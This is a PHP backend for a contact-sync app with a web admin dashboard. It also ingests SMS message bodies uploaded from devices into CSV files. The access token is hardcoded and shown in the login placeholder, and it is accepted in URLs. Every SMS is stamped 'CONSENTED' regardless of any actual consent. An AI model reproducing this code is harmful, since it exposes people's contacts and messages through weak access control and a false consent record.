<?php
// index.php - All-Inclusive Single PHP Engine for Contact Finder
// Combines: Two-Way Cloud Sync, Dynamic Multi-CSV & Device CSV Routing, SMS Logging, 
// and Ultra-Modern Light Glassmorphism Web Excel Admin Dashboard.
ini_set('memory_limit', '512M');
set_time_limit(300);

$secretToken = 'Jmd@2025';
$standardHeaders = ['id', 'name', 'phone', 'details', 'saved', 'updated_at', 'deleted', 'device_id'];

function normalizePhone($phone) {
    if (empty($phone)) return '';
    $trimmed = trim($phone);
    $digits = preg_replace('/[^0-9+]/', '', $trimmed);
    if (strpos($digits, '00') === 0) {
        $digits = '+' . substr($digits, 2);
    }
    if (preg_match('/^[0-9]{10}$/', $digits)) {
        $digits = '+91' . $digits;
    } else if (preg_match('/^91[0-9]{10}$/', $digits)) {
        $digits = '+' . $digits;
    }
    return empty($digits) ? $trimmed : $digits;
}

function sanitizeCsvFileName($name) {
    if (empty($name)) return 'contacts.csv';
    $name = basename(trim($name));
    $clean = preg_replace('/[^a-zA-Z0-9_\-\.]/', '_', $name);
    if (!preg_match('/\.csv$/i', $clean)) {
        $clean .= '.csv';
    }
    return $clean;
}

function listAvailableCsvs() {
    $files = glob("*.csv");
    if (!$files) return ['contacts.csv', 'sms.csv'];
    $res = [];
    foreach ($files as $f) {
        $res[] = basename($f);
    }
    if (!in_array('contacts.csv', $res)) array_unshift($res, 'contacts.csv');
    return array_values(array_unique($res));
}

// Authentication check
$token = isset($_GET['token']) ? $_GET['token'] : (isset($_POST['token']) ? $_POST['token'] : '');
$inputJSON = file_get_contents('php://input');
$input = json_decode($inputJSON, true);
if (is_array($input) && isset($input['token'])) {
    $token = $input['token'];
}

$isApiRequest = (
    (isset($_SERVER['HTTP_ACCEPT']) && strpos($_SERVER['HTTP_ACCEPT'], 'application/json') !== false) ||
    !empty($inputJSON) ||
    isset($_GET['action']) ||
    isset($_GET['format']) && $_GET['format'] === 'json' ||
    isset($_GET['file'])
);

// Determine active CSV target
$targetCsv = 'contacts.csv';
if (!empty($_GET['file'])) {
    $targetCsv = sanitizeCsvFileName($_GET['file']);
} elseif (is_array($input) && !empty($input['file'])) {
    $targetCsv = sanitizeCsvFileName($input['file']);
} elseif (is_array($input) && !empty($input['device_id'])) {
    // If saving from a specific device, route to device-specific file or contacts.csv
    $dev = preg_replace('/[^a-zA-Z0-9_\-]/', '_', trim($input['device_id']));
    if (!empty($dev) && !empty($input['use_device_file'])) {
        $targetCsv = sanitizeCsvFileName("contacts_{$dev}.csv");
    }
}

// Ensure file exists with headers
if (!file_exists($targetCsv)) {
    $fp = fopen($targetCsv, 'w');
    if ($fp) {
        fputcsv($fp, $standardHeaders);
        fclose($fp);
    }
}

// ============================================================================
// API ENDPOINTS (JSON)
// ============================================================================
if ($isApiRequest) {
    header('Content-Type: application/json; charset=utf-8');

    if ($token !== $secretToken) {
        echo json_encode(['ok' => false, 'error' => 'Unauthorized: Invalid token']);
        exit;
    }

    $action = isset($_GET['action']) ? $_GET['action'] : (is_array($input) ? ($input['action'] ?? '') : '');

    // 1. List all CSV files on server
    if ($action === 'list_csvs') {
        $files = listAvailableCsvs();
        $details = [];
        foreach ($files as $f) {
            $details[] = [
                'name' => $f,
                'size' => file_exists($f) ? filesize($f) : 0,
                'modified' => file_exists($f) ? date('Y-m-d H:i:s', filemtime($f)) : ''
            ];
        }
        echo json_encode(['ok' => true, 'files' => $files, 'details' => $details]);
        exit;
    }

    // 2. SMS log upload & sync
    if ($action === 'sync_sms') {
        $smsFile = 'sms.csv';
        $smsRecords = is_array($input) && isset($input['sms_records']) ? $input['sms_records'] : [];
        $devId = is_array($input) && isset($input['device_id']) ? $input['device_id'] : 'UNKNOWN_DEVICE';
        
        $smsHeaders = ['RECORD_TYPE', 'ID', 'NAME', 'PHONE', 'NORMALIZED_NUMBER', 'SOURCE', 'CONSENT', 'STATUS_OR_BODY', 'TIMESTAMP', 'DETAILS'];
        if (!file_exists($smsFile)) {
            $fp = fopen($smsFile, 'w');
            fputcsv($fp, $smsHeaders);
            fclose($fp);
        }

        $fp = fopen($smsFile, 'a');
        $added = 0;
        if ($fp) {
            foreach ($smsRecords as $s) {
                $id = $s['id'] ?? uniqid();
                $addr = $s['address'] ?? '';
                $body = $s['body'] ?? '';
                $date = $s['date'] ?? round(microtime(true) * 1000);
                $type = $s['type'] ?? 'INBOX';
                $norm = normalizePhone($addr);

                fputcsv($fp, [
                    'SMS', $id, '', $addr, $norm, 'DEVICE_SMS', 'CONSENTED', $body, $date, "Type: {$type} | Device: {$devId}"
                ]);
                $added++;
            }
            fclose($fp);
        }

        echo json_encode(['ok' => true, 'message' => "Synced {$added} SMS records", 'file' => $smsFile]);
        exit;
    }

    // 3. GET contacts from target CSV
    if ($_SERVER['REQUEST_METHOD'] === 'GET') {
        $rows = [];
        if (($fp = fopen($targetCsv, 'r')) !== FALSE) {
            $headerRow = fgetcsv($fp, 0, ',', '"', "\\");
            while (($data = fgetcsv($fp, 0, ',', '"', "\\")) !== FALSE) {
                if (count($data) >= 8) {
                    $deleted = ($data[6] === '1' || strtolower($data[6]) === 'true');
                    if ($deleted) continue;
                    $rows[] = [
                        'id' => strval($data[0]),
                        'name' => strval($data[1]),
                        'phone' => normalizePhone($data[2]),
                        'details' => strval($data[3]),
                        'saved' => ($data[4] === '1' || strtolower($data[4]) === 'true'),
                        'updated_at' => strval($data[5]),
                        'deleted' => false,
                        'device_id' => strval($data[7])
                    ];
                } elseif (count($data) >= 2) {
                    $name = trim($data[0]);
                    $phone = normalizePhone($data[1]);
                    if (!empty($name) || !empty($phone)) {
                        $id = md5($name . '|' . $phone);
                        $rows[] = [
                            'id' => $id, 'name' => $name, 'phone' => $phone, 'details' => '',
                            'saved' => false, 'updated_at' => strval(round(microtime(true) * 1000)),
                            'deleted' => false, 'device_id' => 'HOSTINGER'
                        ];
                    }
                }
            }
            fclose($fp);
        }
        echo json_encode(['ok' => true, 'file' => $targetCsv, 'total' => count($rows), 'rows' => $rows]);
        exit;
    }

    // 4. POST changes to target CSV (and duplicate detection support)
    if ($_SERVER['REQUEST_METHOD'] === 'POST') {
        // Read existing rows
        $existing = [];
        if (($fp = fopen($targetCsv, 'r')) !== FALSE) {
            fgetcsv($fp, 0, ',', '"', "\\");
            while (($data = fgetcsv($fp, 0, ',', '"', "\\")) !== FALSE) {
                if (count($data) >= 8) {
                    $existing[strval($data[0])] = [
                        'id' => strval($data[0]),
                        'name' => strval($data[1]),
                        'phone' => normalizePhone($data[2]),
                        'details' => strval($data[3]),
                        'saved' => ($data[4] === '1' || strtolower($data[4]) === 'true' ? '1' : '0'),
                        'updated_at' => strval($data[5]),
                        'deleted' => ($data[6] === '1' || strtolower($data[6]) === 'true' ? '1' : '0'),
                        'device_id' => strval($data[7])
                    ];
                }
            }
            fclose($fp);
        }

        $incoming = isset($input['contacts']) ? $input['contacts'] : [];
        $devId = isset($input['device_id']) ? $input['device_id'] : 'APP_USER';
        $inserted = 0; $updated = 0; $deletedCount = 0;

        foreach ($incoming as $c) {
            if (!isset($c['id'])) continue;
            $id = strval($c['id']);
            $isDel = (isset($c['deleted']) && ($c['deleted'] === true || $c['deleted'] === '1' || $c['deleted'] === 1));

            if ($isDel) {
                if (isset($existing[$id])) {
                    unset($existing[$id]);
                    $deletedCount++;
                }
                continue;
            }

            $newTime = isset($c['updated_at']) ? strval($c['updated_at']) : strval(round(microtime(true) * 1000));
            $name = isset($c['name']) ? trim($c['name']) : '';
            $phone = isset($c['phone']) ? normalizePhone($c['phone']) : '';
            $details = isset($c['details']) ? trim($c['details']) : '';
            $saved = (isset($c['saved']) && ($c['saved'] === true || $c['saved'] === '1' || $c['saved'] === 1)) ? '1' : '0';
            $recDev = isset($c['device_id']) && !empty($c['device_id']) ? $c['device_id'] : $devId;

            if (isset($existing[$id])) {
                $oldTime = $existing[$id]['updated_at'] ?? '0';
                if ($newTime >= $oldTime) {
                    $existing[$id] = [
                        'id' => $id, 'name' => $name, 'phone' => $phone, 'details' => $details,
                        'saved' => $saved, 'updated_at' => $newTime, 'deleted' => '0', 'device_id' => $recDev
                    ];
                    $updated++;
                }
            } else {
                $existing[$id] = [
                    'id' => $id, 'name' => $name, 'phone' => $phone, 'details' => $details,
                    'saved' => $saved, 'updated_at' => $newTime, 'deleted' => '0', 'device_id' => $recDev
                ];
                $inserted++;
            }
        }

        // Write back
        $fp = fopen($targetCsv, 'w');
        fputcsv($fp, $standardHeaders);
        foreach ($existing as $r) {
            fputcsv($fp, [
                $r['id'], $r['name'], $r['phone'], $r['details'],
                $r['saved'], $r['updated_at'], $r['deleted'], $r['device_id']
            ]);
        }
        fclose($fp);

        echo json_encode([
            'ok' => true,
            'file' => $targetCsv,
            'inserted' => $inserted,
            'updated' => $updated,
            'deleted' => $deletedCount,
            'total_in_file' => count($existing)
        ]);
        exit;
    }
}

// ============================================================================
// WEB ADMIN EXCEL SPREADSHEET & DASHBOARD (LIGHT THEME GLASSMORPHISM)
// ============================================================================
session_start();
if (isset($_GET['token']) && $_GET['token'] === $secretToken) {
    $_SESSION['auth_token'] = $secretToken;
}

if (isset($_POST['login_token'])) {
    if ($_POST['login_token'] === $secretToken) {
        $_SESSION['auth_token'] = $secretToken;
        header("Location: index.php?file=" . urlencode($targetCsv));
        exit;
    } else {
        $loginError = "Invalid Security Token!";
    }
}

if (isset($_GET['logout'])) {
    unset($_SESSION['auth_token']);
    session_destroy();
    header("Location: index.php");
    exit;
}

$isAuthenticated = (isset($_SESSION['auth_token']) && $_SESSION['auth_token'] === $secretToken);

// Login Form (Light Glassmorphism)
if (!$isAuthenticated) {
    ?>
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <title>Contact Finder - Sign In</title>
        <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700&display=swap" rel="stylesheet">
        <style>
            :root {
                --bg: #F0F4F8;
                --glass: rgba(255, 255, 255, 0.85);
                --glass-border: rgba(255, 255, 255, 0.9);
                --primary: #007AFF;
                --primary-hover: #0062CC;
                --text-main: #1E293B;
                --text-muted: #64748B;
                --shadow: 0 20px 40px -15px rgba(0, 0, 0, 0.07);
            }
            * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Plus Jakarta Sans', -apple-system, sans-serif; }
            body {
                background: linear-gradient(135deg, #EFF6FF 0%, #F8FAFC 50%, #F1F5F9 100%);
                min-height: 100vh;
                display: flex;
                align-items: center;
                justify-content: center;
                padding: 20px;
            }
            .glass-card {
                background: var(--glass);
                backdrop-filter: blur(20px);
                -webkit-backdrop-filter: blur(20px);
                border: 1px solid var(--glass-border);
                border-radius: 24px;
                padding: 40px 32px;
                width: 100%;
                max-width: 400px;
                box-shadow: var(--shadow);
                text-align: center;
            }
            .logo-icon {
                width: 64px;
                height: 64px;
                background: linear-gradient(135deg, #007AFF 0%, #38BDF8 100%);
                border-radius: 18px;
                display: flex;
                align-items: center;
                justify-content: center;
                font-size: 30px;
                margin: 0 auto 20px;
                box-shadow: 0 10px 20px -5px rgba(0, 122, 255, 0.3);
            }
            h1 { font-size: 24px; font-weight: 700; color: var(--text-main); margin-bottom: 8px; }
            p { font-size: 14px; color: var(--text-muted); margin-bottom: 28px; }
            input[type="password"] {
                width: 100%;
                padding: 14px 16px;
                background: #FFFFFF;
                border: 1.5px solid #E2E8F0;
                border-radius: 12px;
                font-size: 15px;
                color: var(--text-main);
                outline: none;
                transition: all 0.2s;
                margin-bottom: 16px;
            }
            input[type="password"]:focus {
                border-color: var(--primary);
                box-shadow: 0 0 0 4px rgba(0, 122, 255, 0.12);
            }
            button {
                width: 100%;
                padding: 14px;
                background: var(--primary);
                color: white;
                border: none;
                border-radius: 12px;
                font-size: 15px;
                font-weight: 600;
                cursor: pointer;
                transition: all 0.2s;
                box-shadow: 0 4px 12px rgba(0, 122, 255, 0.25);
            }
            button:hover { background: var(--primary-hover); transform: translateY(-1px); }
            .error-badge {
                background: #FEE2E2;
                color: #DC2626;
                padding: 10px 14px;
                border-radius: 10px;
                font-size: 13px;
                font-weight: 500;
                margin-bottom: 16px;
            }
        </style>
    </head>
    <body>
        <div class="glass-card">
            <div class="logo-icon">📇</div>
            <h1>Contact Finder Pro</h1>
            <p>All-Inclusive Hostinger Backend</p>
            <?php if (isset($loginError)): ?>
                <div class="error-badge"><?php echo htmlspecialchars($loginError); ?></div>
            <?php endif; ?>
            <form method="POST">
                <input type="password" name="login_token" placeholder="Enter Secret Token (Jmd@2025)" required autofocus>
                <button type="submit">Unlock Dashboard</button>
            </form>
        </div>
    </body>
    </html>
    <?php
    exit;
}

// Handle Admin Actions (Add, Edit Batch, Delete Row, Clean Duplicates)
$notice = '';
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Read all rows into memory
    $rows = [];
    if (file_exists($targetCsv) && ($fp = fopen($targetCsv, 'r')) !== FALSE) {
        fgetcsv($fp, 0, ',', '"', "\\");
        while (($data = fgetcsv($fp, 0, ',', '"', "\\")) !== FALSE) {
            if (count($data) >= 8) {
                $rows[strval($data[0])] = [
                    'id' => strval($data[0]),
                    'name' => strval($data[1]),
                    'phone' => normalizePhone($data[2]),
                    'details' => strval($data[3]),
                    'saved' => strval($data[4]),
                    'updated_at' => strval($data[5]),
                    'deleted' => strval($data[6]),
                    'device_id' => strval($data[7])
                ];
            }
        }
        fclose($fp);
    }

    if (isset($_POST['delete_id'])) {
        $del = $_POST['delete_id'];
        if (isset($rows[$del])) {
            unset($rows[$del]);
            $notice = "Contact removed permanently!";
        }
    } elseif (isset($_POST['add_contact'])) {
        $n = trim($_POST['new_name'] ?? '');
        $p = normalizePhone($_POST['new_phone'] ?? '');
        $d = trim($_POST['new_details'] ?? '');
        $dev = trim($_POST['new_device'] ?? 'WEB_ADMIN');
        if (!empty($n) || !empty($p)) {
            $nid = md5($n . '|' . $p . '|' . microtime(true));
            $rows[$nid] = [
                'id' => $nid, 'name' => $n, 'phone' => $p, 'details' => $d,
                'saved' => '0', 'updated_at' => strval(round(microtime(true) * 1000)),
                'deleted' => '0', 'device_id' => $dev
            ];
            $notice = "Contact added successfully!";
        }
    } elseif (isset($_POST['clean_duplicates'])) {
        // Remove duplicate phone records, keeping first entry
        $seen = [];
        $cleanedCount = 0;
        foreach ($rows as $id => $r) {
            $norm = normalizePhone($r['phone']);
            if (empty($norm)) continue;
            if (isset($seen[$norm])) {
                unset($rows[$id]);
                $cleanedCount++;
            } else {
                $seen[$norm] = true;
            }
        }
        $notice = "Cleaned {$cleanedCount} duplicate phone records!";
    } elseif (isset($_POST['save_table'])) {
        $ids = $_POST['id'] ?? [];
        $names = $_POST['name'] ?? [];
        $phones = $_POST['phone'] ?? [];
        $details = $_POST['details'] ?? [];
        $saved = $_POST['saved'] ?? [];
        $devices = $_POST['device_id'] ?? [];

        for ($i = 0; $i < count($ids); $i++) {
            $id = trim($ids[$i]);
            if (empty($id) || !isset($rows[$id])) continue;
            $rows[$id]['name'] = trim($names[$i]);
            $rows[$id]['phone'] = normalizePhone($phones[$i]);
            $rows[$id]['details'] = trim($details[$i]);
            $rows[$id]['saved'] = isset($saved[$i]) ? '1' : '0';
            $rows[$id]['device_id'] = trim($devices[$i]);
            $rows[$id]['updated_at'] = strval(round(microtime(true) * 1000));
        }
        $notice = "All spreadsheet changes saved successfully!";
    }

    // Write back to file
    $fp = fopen($targetCsv, 'w');
    fputcsv($fp, $standardHeaders);
    foreach ($rows as $r) {
        fputcsv($fp, [
            $r['id'], $r['name'], $r['phone'], $r['details'],
            $r['saved'], $r['updated_at'], $r['deleted'], $r['device_id']
        ]);
    }
    fclose($fp);
}

// Load rows for display
$displayRows = [];
$uniquePhones = [];
$duplicateCount = 0;
if (file_exists($targetCsv) && ($fp = fopen($targetCsv, 'r')) !== FALSE) {
    fgetcsv($fp, 0, ',', '"', "\\");
    while (($data = fgetcsv($fp, 0, ',', '"', "\\")) !== FALSE) {
        if (count($data) >= 8 && $data[6] !== '1') {
            $p = normalizePhone($data[2]);
            if (!empty($p)) {
                if (isset($uniquePhones[$p])) {
                    $duplicateCount++;
                } else {
                    $uniquePhones[$p] = true;
                }
            }
            $displayRows[] = [
                'id' => $data[0], 'name' => $data[1], 'phone' => $p,
                'details' => $data[3], 'saved' => $data[4], 'updated_at' => $data[5],
                'deleted' => $data[6], 'device_id' => $data[7]
            ];
        }
    }
    fclose($fp);
}

$availableCsvs = listAvailableCsvs();
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Contact Finder - Light Glassmorphism Web Excel</title>
    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700&display=swap" rel="stylesheet">
    <style>
        :root {
            --bg: #F4F7FB;
            --glass-card: rgba(255, 255, 255, 0.85);
            --glass-border: rgba(255, 255, 255, 0.8);
            --border-subtle: #E2E8F0;
            --primary: #007AFF;
            --primary-hover: #0062CC;
            --success: #10B981;
            --danger: #EF4444;
            --amber: #F59E0B;
            --text-main: #1E293B;
            --text-muted: #64748B;
        }
        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Plus Jakarta Sans', -apple-system, sans-serif; }
        body {
            background: linear-gradient(135deg, #F0F4F8 0%, #FFFFFF 50%, #EDF2F7 100%);
            min-height: 100vh;
            color: var(--text-main);
            padding: 20px;
        }
        .container {
            max-width: 1440px;
            margin: 0 auto;
        }
        .header-bar {
            background: var(--glass-card);
            backdrop-filter: blur(16px);
            -webkit-backdrop-filter: blur(16px);
            border: 1px solid var(--glass-border);
            border-radius: 20px;
            padding: 20px 24px;
            display: flex;
            align-items: center;
            justify-content: space-between;
            flex-wrap: wrap;
            gap: 16px;
            margin-bottom: 20px;
            box-shadow: 0 10px 30px -10px rgba(0,0,0,0.05);
        }
        .logo-title {
            display: flex;
            align-items: center;
            gap: 14px;
        }
        .logo-title .icon {
            font-size: 28px;
            background: #EBF5FF;
            padding: 10px;
            border-radius: 14px;
        }
        .logo-title h2 { font-size: 20px; font-weight: 700; }
        .logo-title p { font-size: 13px; color: var(--text-muted); }
        .controls {
            display: flex;
            align-items: center;
            gap: 10px;
            flex-wrap: wrap;
        }
        .btn {
            padding: 10px 18px;
            border-radius: 12px;
            font-size: 14px;
            font-weight: 600;
            cursor: pointer;
            border: none;
            text-decoration: none;
            display: inline-flex;
            align-items: center;
            gap: 6px;
            transition: all 0.2s;
        }
        .btn-primary { background: var(--primary); color: white; }
        .btn-primary:hover { background: var(--primary-hover); transform: translateY(-1px); }
        .btn-success { background: var(--success); color: white; }
        .btn-amber { background: var(--amber); color: white; }
        .btn-light { background: #FFFFFF; color: var(--text-main); border: 1px solid var(--border-subtle); }
        .btn-light:hover { background: #F8FAFC; }
        .select-csv {
            padding: 10px 14px;
            border-radius: 12px;
            border: 1.5px solid var(--border-subtle);
            background: white;
            font-size: 14px;
            font-weight: 600;
            color: var(--text-main);
            outline: none;
        }
        .stat-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 14px;
            margin-bottom: 20px;
        }
        .stat-card {
            background: var(--glass-card);
            backdrop-filter: blur(12px);
            border: 1px solid var(--glass-border);
            border-radius: 16px;
            padding: 16px 20px;
            box-shadow: 0 4px 15px -5px rgba(0,0,0,0.03);
        }
        .stat-card .label { font-size: 12px; font-weight: 600; color: var(--text-muted); text-transform: uppercase; margin-bottom: 4px; }
        .stat-card .value { font-size: 22px; font-weight: 700; color: var(--primary); }
        .notice-banner {
            background: #D1FAE5;
            color: #065F46;
            padding: 12px 20px;
            border-radius: 14px;
            font-size: 14px;
            font-weight: 600;
            margin-bottom: 20px;
        }
        .add-card {
            background: var(--glass-card);
            backdrop-filter: blur(16px);
            border: 1px solid var(--glass-border);
            border-radius: 18px;
            padding: 18px 24px;
            margin-bottom: 20px;
            display: flex;
            align-items: center;
            gap: 12px;
            flex-wrap: wrap;
        }
        .add-card input {
            padding: 10px 14px;
            background: white;
            border: 1px solid var(--border-subtle);
            border-radius: 10px;
            font-size: 14px;
            flex: 1;
            min-width: 140px;
            outline: none;
        }
        .table-card {
            background: var(--glass-card);
            backdrop-filter: blur(20px);
            border: 1px solid var(--glass-border);
            border-radius: 20px;
            padding: 20px;
            box-shadow: 0 10px 30px -10px rgba(0,0,0,0.05);
            overflow-x: auto;
        }
        .search-box {
            width: 100%;
            max-width: 320px;
            padding: 10px 16px;
            border: 1.5px solid var(--border-subtle);
            border-radius: 12px;
            margin-bottom: 16px;
            font-size: 14px;
            outline: none;
            background: white;
        }
        table {
            width: 100%;
            border-collapse: collapse;
            font-size: 14px;
        }
        th {
            background: #F8FAFC;
            color: var(--text-muted);
            font-weight: 600;
            text-align: left;
            padding: 12px 14px;
            border-bottom: 1px solid var(--border-subtle);
        }
        td {
            padding: 10px 14px;
            border-bottom: 1px solid var(--border-subtle);
        }
        tr:hover td {
            background: rgba(241, 245, 249, 0.6);
        }
        input.cell-edit {
            width: 100%;
            border: 1px solid transparent;
            background: transparent;
            font-size: 14px;
            padding: 6px 8px;
            border-radius: 8px;
            color: var(--text-main);
            outline: none;
            transition: all 0.2s;
        }
        input.cell-edit:focus {
            background: white;
            border-color: var(--primary);
            box-shadow: 0 0 0 3px rgba(0, 122, 255, 0.1);
        }
        .btn-del {
            background: #FEE2E2;
            color: var(--danger);
            border: none;
            padding: 6px 10px;
            border-radius: 8px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.2s;
        }
        .btn-del:hover { background: var(--danger); color: white; }
    </style>
</head>
<body>
<div class="container">
    <!-- Top Header -->
    <div class="header-bar">
        <div class="logo-title">
            <div class="icon">📇</div>
            <div>
                <h2>Contact Finder Pro • Cloud Hub</h2>
                <p>Viewing <strong><?php echo htmlspecialchars($targetCsv); ?></strong> • Light Glassmorphism Dashboard</p>
            </div>
        </div>
        <div class="controls">
            <!-- CSV Selector -->
            <select class="select-csv" onchange="location.href='index.php?file=' + encodeURIComponent(this.value)">
                <?php foreach ($availableCsvs as $f): ?>
                    <option value="<?php echo htmlspecialchars($f); ?>" <?php if ($f === $targetCsv) echo 'selected'; ?>>
                        📁 <?php echo htmlspecialchars($f); ?>
                    </option>
                <?php endforeach; ?>
            </select>

            <button type="button" class="btn btn-primary" onclick="document.getElementById('mainForm').submit()">💾 Save All Rows</button>
            <?php if ($duplicateCount > 0): ?>
                <form method="POST" style="display:inline;">
                    <button type="submit" name="clean_duplicates" value="1" class="btn btn-amber" onclick="return confirm('Clean all duplicate phone numbers in <?php echo $targetCsv; ?>?')">
                        🧹 Clean <?php echo $duplicateCount; ?> Duplicates
                    </button>
                </form>
            <?php endif; ?>
            <a href="index.php?logout=1" class="btn btn-light">🚪 Logout</a>
        </div>
    </div>

    <!-- Stats Grid -->
    <div class="stat-grid">
        <div class="stat-card">
            <div class="label">Total Records</div>
            <div class="value"><?php echo count($displayRows); ?></div>
        </div>
        <div class="stat-card">
            <div class="label">Unique Phone Numbers</div>
            <div class="value"><?php echo count($uniquePhones); ?></div>
        </div>
        <div class="stat-card">
            <div class="label">Duplicate Numbers</div>
            <div class="value" style="color: <?php echo $duplicateCount > 0 ? 'var(--amber)' : 'var(--success)'; ?>">
                <?php echo $duplicateCount; ?>
            </div>
        </div>
        <div class="stat-card">
            <div class="label">File Size</div>
            <div class="value"><?php echo file_exists($targetCsv) ? round(filesize($targetCsv) / 1024, 1) . ' KB' : '0 KB'; ?></div>
        </div>
    </div>

    <?php if (!empty($notice)): ?>
        <div class="notice-banner">✨ <?php echo htmlspecialchars($notice); ?></div>
    <?php endif; ?>

    <!-- Add Contact Form -->
    <form method="POST" class="add-card">
        <strong>➕ Add New:</strong>
        <input type="text" name="new_name" placeholder="Full Name" required>
        <input type="text" name="new_phone" placeholder="Phone (+91...)" required>
        <input type="text" name="new_details" placeholder="Details / Loan Notes">
        <input type="text" name="new_device" placeholder="Device Label" value="WEB_ADMIN">
        <button type="submit" name="add_contact" value="1" class="btn btn-success">Add Record</button>
    </form>

    <!-- Spreadsheet Editor -->
    <div class="table-card">
        <input type="text" id="filterInput" class="search-box" placeholder="🔍 Quick search in table…" onkeyup="filterTable()">
        <form method="POST" id="mainForm">
            <input type="hidden" name="save_table" value="1">
            <table id="contactTable">
                <thead>
                    <tr>
                        <th style="width: 24%;">Name</th>
                        <th style="width: 20%;">Phone Number</th>
                        <th style="width: 28%;">Details / Notes</th>
                        <th style="width: 8%; text-align: center;">Starred</th>
                        <th style="width: 14%;">Device Origin</th>
                        <th style="width: 6%; text-align: center;">Action</th>
                    </tr>
                </thead>
                <tbody>
                    <?php foreach ($displayRows as $idx => $r): ?>
                    <tr>
                        <input type="hidden" name="id[]" value="<?php echo htmlspecialchars($r['id']); ?>">
                        <td><input type="text" class="cell-edit" name="name[]" value="<?php echo htmlspecialchars($r['name']); ?>"></td>
                        <td><input type="text" class="cell-edit" name="phone[]" value="<?php echo htmlspecialchars($r['phone']); ?>"></td>
                        <td><input type="text" class="cell-edit" name="details[]" value="<?php echo htmlspecialchars($r['details']); ?>"></td>
                        <td style="text-align: center;">
                            <input type="checkbox" name="saved[<?php echo $idx; ?>]" value="1" <?php echo ($r['saved'] === '1' || $r['saved'] === true) ? 'checked' : ''; ?>>
                        </td>
                        <td><input type="text" class="cell-edit" name="device_id[]" value="<?php echo htmlspecialchars($r['device_id']); ?>"></td>
                        <td style="text-align: center;">
                            <button type="submit" name="delete_id" value="<?php echo htmlspecialchars($r['id']); ?>" class="btn-del" onclick="return confirm('Permanently delete this contact?');">🗑️</button>
                        </td>
                    </tr>
                    <?php endforeach; ?>
                </tbody>
            </table>
        </form>
    </div>
</div>

<script>
function filterTable() {
    var input = document.getElementById("filterInput");
    var filter = input.value.toLowerCase();
    var table = document.getElementById("contactTable");
    var tr = table.getElementsByTagName("tr");
    for (var i = 1; i < tr.length; i++) {
        var text = tr[i].innerText.toLowerCase();
        tr[i].style.display = text.indexOf(filter) > -1 ? "" : "none";
    }
}
</script>
</body>
</html>
